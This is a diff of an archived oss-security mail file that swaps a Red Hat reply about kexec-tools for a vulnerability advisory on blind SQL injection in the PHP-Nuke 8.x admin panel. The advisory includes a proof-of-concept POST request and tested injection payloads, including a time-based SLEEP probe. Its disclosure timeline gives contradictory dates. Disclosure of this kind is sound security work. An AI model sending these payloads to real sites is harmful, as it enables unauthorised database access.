@@ -1,26 +1,120 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/10/07/3
-Message-ID: <4E8EC67B.60201@redhat.com>
-Date: Fri, 07 Oct 2011 14:59:31 +0530
-From: Huzaifa Sidhpurwala <huzaifas@...hat.com>
-To: akuster <akuster@...sta.com>
-CC: oss-security@...ts.openwall.com
-Subject: Re: kexec-tools: Multiple security flaws by management of kdump core files and ramdisk images
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/03/23/7
+Message-ID: <AANLkTinZ52bvCrcBdt9L6vs2FVFASMLuoDmt7PhqvZv9@mail.gmail.com>
+Date: Wed, 23 Mar 2011 22:56:09 +0800
+From: YGN Ethical Hacker Group <lists@...g.net>
+To: oss-security@...ts.openwall.com
+Subject: CVE Request: PHP-Nuke 8.x <= "chng_uid" Blind SQL Injection Vulnerability
 Content-Type: text/plain; charset=utf-8
 
-On 10/05/2011 10:09 PM, akuster wrote:
-> What version does this affect ?
-
-My mail should have been more verbose earlier. sorry for that!
-
-The flaw exists in the set of shell scripts, shipped with Red Hat 
-Enterprise Linux and Fedora kexec-tools packages.
-
-(kdump.init and mkdumprd, more specifically)
-
-I am not sure what other distros. ship these scripts.
+PHP-Nuke 8.x <= Blind SQL Injection Vulnerability
 
 
 
--- 
-Huzaifa Sidhpurwala / Red Hat Security Response Team
+1. OVERVIEW
+
+The administration backend of PHP-Nuke 8.x is vulnerable to Blind SQL Injection.
+
+
+2. BACKGROUND
+
+PHP-Nuke is a Web Portal System or content management system. The goal
+of PHP-Nuke is to have an automated web site to distribute news and
+articles with users system. Each user can submit comments to discuss
+the articles. Main features include: web based admin, surveys, top
+page, access stats page with counter, user customizable box, themes
+manager for registered users, friendly administration GUI with graphic
+topic manager, option to edit or delete stories, option to delete
+comments, moderation system, Referrers page to know who link us,
+sections manager, customizable HTML blocks, user and authors edit, an
+integrated Banners Ads system, search engine, backend/headlines
+generation (RSS/RDF format), and many, many more friendly functions.
+
+
+3. VULNERABILITY DESCRIPTION
+
+The "chng_uid" parameter is not properly sanitized upon submission to
+the /admin.php which leads to Blind SQL Injection vulnerability.
+This allows an attacker to inject or manipulate SQL queries in the
+back-end database, allowing for the manipulation or disclosure of
+arbitrary data.
+
+
+4. VERSIONS AFFECTED
+
+8.0 and lower
+
+Tested version: 8.0
+The paid versions, 8.1 and 9.0, of php-Nuke may be vulnerable as well.
+
+
+5. PROOF-OF-CONCEPT/EXPLOIT
+
+=> /admin.php
+
+POST /admin.php HTTP/1.1
+Referer: http://localhost/admin.php?op=mod_users
+Content-Type: application/x-www-form-urlencoded
+Host: localhost
+
+chng_uid=[BLIND_SQL_INJECTION]+&op=modifyUser
+
+
+Tested Payloads:
+' or 1=1-- [TRUE]
+' or 1=2-- [FALSE]
+' or substring(@@version,1,1)=5--  [TRUE if mySQL version is 5.x]
+' or substring(@@version,1,1)=4--  [FALSE if mySQL version is 5.x]
+' or SLEEP(15)=0-- [sleep for 15 seconds]
+
+Successful response (True) returns the user update form page.
+
+
+6. SOLUTION
+
+Lock down access to php-Nuke administration backend.
+No patch is available yet.
+Use of this product is NOT recommended because of long lack of update
+and vendor negligence about security reports.
+
+
+7. VENDOR
+
+php-Nuke Developers
+http://phpnuke.org/
+
+
+8. CREDIT
+
+Aung Khant, http://yehg.net, YGN Ethical Hacker Group, Myanmar.
+
+
+9. DISCLOSURE TIME-LINE
+
+2011-01-01: contacted author through emails
+2011-01-25: contacted author through web site contact form
+2010-03-23: no replies from author
+2010-03-23: vulnerability disclosed
+
+
+10. REFERENCES
+
+Original Advisory URL:
+http://yehg.net/lab/pr0js/advisories/[phpnuke-8.x]_sql_injection
+About PHP-Nuke: http://en.wikipedia.org/wiki/PHP-Nuke
+PHP-Nuke 8.0: http://phpnuke.org/modules.php?name=Downloads&d_op=getit&lid=658
+CWE-89: http://cwe.mitre.org/data/definitions/89.html
+
+
+
+#yehg [2010-03-23]
+
+keywords: php nuke, php-nuke, phpnuke, 8.0, 8.1, blind, sqlin, sql injection
+
+---------------------------------
+Best regards,
+YGN Ethical Hacker Group
+Yangon, Myanmar
+http://yehg.net
+Our Lab | http://yehg.net/lab
+Our Directory | http://yehg.net/hwd
